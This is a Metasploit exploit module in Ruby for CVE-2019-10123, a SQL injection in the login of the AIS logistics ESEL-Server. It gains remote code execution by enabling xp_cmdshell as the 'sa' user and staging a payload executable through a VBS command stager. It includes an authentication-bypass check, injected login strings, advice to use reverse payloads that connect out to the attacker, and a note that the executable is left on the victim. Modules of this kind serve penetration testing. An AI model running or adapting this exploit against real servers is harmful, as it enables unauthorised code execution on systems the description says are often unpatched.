# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::MSSQL_COMMANDS
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AIS logistics ESEL-Server Unauth SQL Injection RCE&#039;,
      &#039;Description&#039;    => %q{
        This module will execute an arbitrary payload on an "ESEL" server used by the
        AIS logistic software. The server typically listens on port 5099 without TLS.
        There could also be server listening on 5100 with TLS but the port 5099 is
        usually always open.
        The login process is vulnerable to an SQL Injection. Usually a MSSQL Server
        with the &#039;sa&#039; user is in place.

        This module was verified on version 67 but it should also run on lower versions.
        An fixed version was created by AIS in September 2017. However most systems
        have not been updated.

        In regard to the payload, unless there is a closed port in the web server,
        you dont want to use any "bind" payload. You want a "reverse" payload,
        probably to your port 80 or to any other outbound port allowed on the firewall.

        Currently, one delivery method is supported

        This method takes advantage of the Command Stager subsystem. This allows using
        various techniques, such as using a TFTP server, to send the executable. By default
        the Command Stager uses &#039;wcsript.exe&#039; to generate the executable on the target.

        NOTE: This module will leave a payload executable on the target system when the
        attack is finished.

      },
      &#039;Author&#039;         =>
        [
          &#039;Manuel Feifel&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-10123&#039;],
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;  => "\x00\xff\x27",
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;CmdStagerFlavor&#039; => &#039;vbs&#039;,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;2019-03-27&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 5099
        },
      ))
  end

  # This is method required for the CmdStager to work...
  def execute_command(cmd, _opts)
    cmd_xp = "EXEC master..xp_cmdshell &#039;#{cmd}&#039;"
    send_login_msg(create_login_msg_sql(cmd_xp))
  end

  def send_login_msg(login_msg, check_response = true)
    length = login_msg.length
    length += length.to_s.length
    login_msg = "#{length}#{login_msg}"

    connect

    sock.put(login_msg)
    response = sock.recv(10000)

    if check_response
      if (response.include? &#039;Zugangsdaten Falsch&#039;) && (response.length > (length - 20))
        print_good(&#039;Correct response received => Data send successfully&#039;)
      else
        print_warning(&#039;Wrong response received => Probably data could not be sent successfully&#039;)
      end
    end

    return response
  ensure
    # Every time a new Connection is required
    disconnect
  end

  # embeds a sql command into the login message
  def create_login_msg_sql(sql_cmd)
    return create_login_msg("#{rand(1_000..9_999)}&#039;; #{sql_cmd}--")
  end

  # create a plain login message
  def create_login_msg(pw)
    delim = "\xFF"
    login_str = "#{delim}000000#{delim}20180810213226#{delim}01#{delim}60"\
                "#{delim}02#{delim}1111#{delim}#{pw}#{delim}AAAAA#{delim}120"

  end

  def check
    int = rand(1..1_000)
    response_bypass = send_login_msg(create_login_msg("#{rand(1_000..9_999)}&#039; OR #{int}=#{int}--"), false)
    if response_bypass.include? &#039;Zugangsdaten OK&#039;
      CheckCode::Vulnerable
    else
      print_status("Response was: #{response_bypass}")
      CheckCode::Safe
    end
  end

  def exploit
    # enable xp cmdshell, used to execute commands later
    # Software uses the &#039;sa&#039; user by default
    send_login_msg(create_login_msg_sql(mssql_xpcmdshell_enable))
    # The porotocol has no limites on max-data
    execute_cmdstager({ :linemax => 1500 })
    print_warning(&#039;The payload is left on the client in the \%TEMP\% Folder of the corresponding user.&#039;)
    print_status(&#039;Stager should now be executed.&#039;)
  end
end

